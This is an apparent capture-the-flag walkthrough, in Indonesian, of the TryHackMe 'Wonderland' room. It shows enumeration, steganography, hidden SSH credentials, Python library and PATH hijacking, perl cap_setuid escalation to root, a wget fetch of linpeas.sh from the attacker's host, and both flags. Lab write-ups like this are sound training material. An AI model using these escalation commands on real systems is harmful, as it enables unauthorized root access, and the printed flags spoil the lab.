```
Enum, dapet port 80 sama port service ssh
```

```
wuvel@wuvel:~$ gob 10.10.101.98 -t 50
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.101.98
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/06/16 07:59:43 Starting gobuster
===============================================================
/img (Status: 301)
/r (Status: 301)
/poem (Status: 301)
```

```
wget -r http://10.10.101.98/img/

wuvel@wuvel:~/Wuvel/CTF/TryHackMe/Wonderland$ steghide extract -sf 10.10.101.98/img/white_rabbit_1.jpg 
Enter passphrase: 
wrote extracted data to "hint.txt".

wuvel@wuvel:~/Wuvel/CTF/TryHackMe/Wonderland$ cat hint.txt 
follow the r a b b i t
```

```
Karena kita sudah dapet direktori /r, kita coba masuk ke direktori /r/a/b/b/i/t

<p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>

Dapet deh username:password buat ssh
```

```
wuvel@wuvel:~$ ssh alice@10.10.101.98
The authenticity of host '10.10.101.98 (10.10.101.98)' can't be established.
ECDSA key fingerprint is SHA256:HUoT05UWCcf3WRhR5kF7yKX1yqUvNhjqtxuUMyOeqR8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.101.98' (ECDSA) to the list of known hosts.
alice@10.10.101.98's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Jun 16 01:13:49 UTC 2020

  System load:  0.04               Processes:           84
  Usage of /:   19.3% of 19.56GB   Users logged in:     0
  Memory usage: 31%                IP address for eth0: 10.10.101.98
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.


Last login: Mon May 25 16:37:21 2020 from 192.168.170.1
alice@wonderland:~$
```

```
alice@wonderland:~$ sudo -l
[sudo] password for alice: 
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

```
import os; os.system("/bin/sh") > random.py

alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
$ whoami
rabbit

rabbit@wonderland:/home/rabbit$ cat /root/user.txt (Hint was everything is upside down)
thm{"Curiouser and curiouser!"}
```

```
rabbit@wonderland:/home/rabbit$ ls -la
total 44
drwxr-x--- 2 rabbit rabbit  4096 Jun 16 01:24 .
drwxr-xr-x 6 root   root    4096 May 25 17:52 ..
lrwxrwxrwx 1 root   root       9 May 25 17:53 .bash_history -> /dev/null
-rw-r--r-- 1 rabbit rabbit   220 May 25 03:01 .bash_logout
-rw-r--r-- 1 rabbit rabbit  3771 May 25 03:01 .bashrc
-rw-r--r-- 1 rabbit rabbit   807 May 25 03:01 .profile
-rw-r--r-- 1 rabbit rabbit    22 Jun 16 01:24 date
-rwsr-sr-x 1 root   root   16816 May 25 17:58 teaParty

SUID!

rabbit@wonderland:/home/rabbit$ cat date 
#!/bin/bash
/bin/bash
rabbit@wonderland:/home/rabbit$ chmod +x date
rabbit@wonderland:/home/rabbit$ export PATH=/home/rabbit:$PATH -> https://attack.mitre.org/beta/techniques/T1574/007/

rabbit@wonderland:/home/rabbit$ ./teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by 
hatter@wonderland:/home/rabbit$
```

```
hatter@wonderland:/tmp$ wget 10.9.2.21:8000/Wuvel/CTF/Bahan/poor-mans-pentest-master/linpeas.sh

atter@wonderland:/tmp$ getcap -r / 2>/dev/null
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep

./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";' -> from GTFOBins

hatter@wonderland:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
# whoami
root

root@wonderland:/home# cd alice
root@wonderland:/home/alice# ls
random.py  root.txt  walrus_and_the_carpenter.py
root@wonderland:/home/alice# cat root.txt 
thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
```